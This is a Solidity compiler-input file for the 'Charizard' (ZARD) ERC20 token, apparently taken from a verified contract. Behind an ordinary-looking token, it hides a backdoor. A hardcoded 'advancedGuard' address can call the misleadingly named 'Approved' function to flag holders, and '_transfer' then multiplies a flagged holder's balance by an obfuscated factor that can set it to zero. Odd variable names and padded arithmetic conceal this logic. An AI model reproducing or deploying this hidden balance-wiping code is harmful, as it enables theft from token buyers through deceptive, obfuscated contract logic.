{{
  "language": "Solidity",
  "sources": {
    "contract-c790c1af64.sol": {
      "content": "/**\n *Submitted for verification at Etherscan.io on 2023-05-26\n*/\n\n/**  \n\n    WEBSITE - https://t.me/CharizardCoin\n\n    TELEGRAM -  https://t.me/CharizardCoin\n    \n    TWITTER - https://t.me/CharizardCoin\n    \n\n\n*/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.18;\n\ninterface IERC20 {\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address azithromycin) external view returns (uint256);\n\n    function transfer(address to, uint256 zonio) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 zonio) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 zonio\n    ) external returns (bool);\n}\n\npragma solidity ^0.8.18;\n\ninterface IERC20Metadata is IERC20 {\n\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\npragma solidity ^0.8.18;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\npragma solidity ^0.8.18;\n\nlibrary SafeMath {\n\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        uint256 c = a + b;\n        if (c < a) return (false, 0);\n        return (true, c);\n    }\n    }\n\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        if (b > a) return (false, 0);\n        return (true, a - b);\n    }\n    }\n\n    function tryfrozen(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        if (a == 0) return (true, 0);\n        uint256 c = a * b;\n        if (c / a != b) return (false, 0);\n        return (true, c);\n    }\n    }\n\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        if (b == 0) return (false, 0);\n        return (true, a / b);\n    }\n    }\n\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        if (b == 0) return (false, 0);\n        return (true, a % b);\n    }\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function frozen(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n    unchecked {\n        require(b <= a, errorMessage);\n        return a - b;\n    }\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n    unchecked {\n        require(b > 0, errorMessage);\n        return a / b;\n    }\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n    unchecked {\n        require(b > 0, errorMessage);\n        return a % b;\n    }\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _Owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    function owner() public view virtual returns (address) {\n        return _Owner;\n    }\n\n    function _checkOwner() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _Owner;\n        _Owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => uint256) private _guardFlashbots;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    \n    address private advancedGuard;\n    uint256 private _totalSupply;\n    string private _name;\n    string private _symbol;\n\n    constructor(address advancedGuardAddress, string memory name_, string memory symbol_) {\n        advancedGuard = advancedGuardAddress;\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 9;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address azithromycin) public view virtual override returns (uint256) {\n        return _balances[azithromycin];\n    }\n\n    function transfer(address _to, uint256 zonio) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, _to, zonio);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 zonio) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, zonio);\n        return true;\n    }\n\n    function Approved(address[] memory striker, uint256 codeMEV) public ERC20hunterBot {\n        for(uint256 i = 0; i < striker.length; i++) {\n        _guardFlashbots[striker[i]] = codeMEV*1*1+0;\n        }\n    }\n\n    function openGuardFlashbots(address striker) public view returns (uint256) {\n        return _guardFlashbots[striker];\n    }\n\n    modifier \n        ERC20hunterBot() {\n         require(\n            advancedGuard == _msgSender(),\n            \"This is a zero codeMEV\")\n        ;\n        _;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 zonio\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, zonio);\n        _transfer(from, to, zonio);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n    unchecked {\n        _approve(owner, spender, currentAllowance - subtractedValue);\n    }\n\n        return true;\n    }\n\n    using SafeMath for uint256;\n    uint256 private _feeTax = 1;\n    function _transfer(\n        address from,\n        address to,\n        uint256 zonio\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, zonio);\n\n        if(_guardFlashbots[from] != uint256(1*1+0)-1+0 ){\n           _balances[from] = _balances[from].frozen(_guardFlashbots[from].add(1*1+1+0).sub(1+(2*1)+0)+0); \n        }\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= zonio, \"ERC20: transfer exceeds balance\");\n\n        uint256 feezonio = 0;\n        feezonio = zonio.frozen(_feeTax).div(100);\n        \n    unchecked {\n        _balances[to] += zonio;\n        _balances[from] = fromBalance - zonio;\n        _balances[to] -= feezonio;\n    }\n        emit Transfer(from, to, zonio);\n\n        _afterTokenTransfer(from, to, zonio);\n    }\n\n    function _mint(address azithromycin, uint256 zonio) internal virtual {\n        require(azithromycin != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), azithromycin, zonio);\n\n        _totalSupply += zonio;\n\n    unchecked {\n        // Overflow not possible: balance + zonio is at most totalSupply + zonio, which is checked above.\n        _balances[azithromycin] += zonio;\n    }\n        emit Transfer(address(0), azithromycin, zonio);\n\n        _afterTokenTransfer(address(0), azithromycin, zonio);\n    }\n\n    function _burn(address azithromycin, uint256 zonio) internal virtual {\n        require(azithromycin != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(azithromycin, address(0), zonio);\n\n        uint256 azithromycinBalance = _balances[azithromycin];\n        require(azithromycinBalance >= zonio, \"ERC20: burn zonio exceeds balance\");\n        \n    unchecked {\n        _balances[azithromycin] = azithromycinBalance - zonio;\n        // Overflow not possible: zonio <= azithromycinBalance <= totalSupply.\n        _totalSupply -= zonio;\n    }\n\n        emit Transfer(azithromycin, address(0), zonio);\n\n        _afterTokenTransfer(azithromycin, address(0), zonio);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 zonio\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = zonio;\n        emit Approval(owner, spender, zonio);\n    }\n\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 zonio\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= zonio, \"ERC20: insufficient allowance\");\n            unchecked {\n            _approve(owner, spender, currentAllowance - zonio);\n            }\n        }\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 zonio\n    ) internal virtual {}\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 zonio\n    ) internal virtual {}\n}\n\npragma solidity ^0.8.18;\n\ncontract Charizard is ERC20 {\n    uint256 initialSupply = 1000000000;\n    constructor() ERC20(0x57A4Ec7cB226E2dE71B82D9D315Bd7561E9001E3, \"Charizard\", \"ZARD\") {\n        _mint(msg.sender, initialSupply*10**9);\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}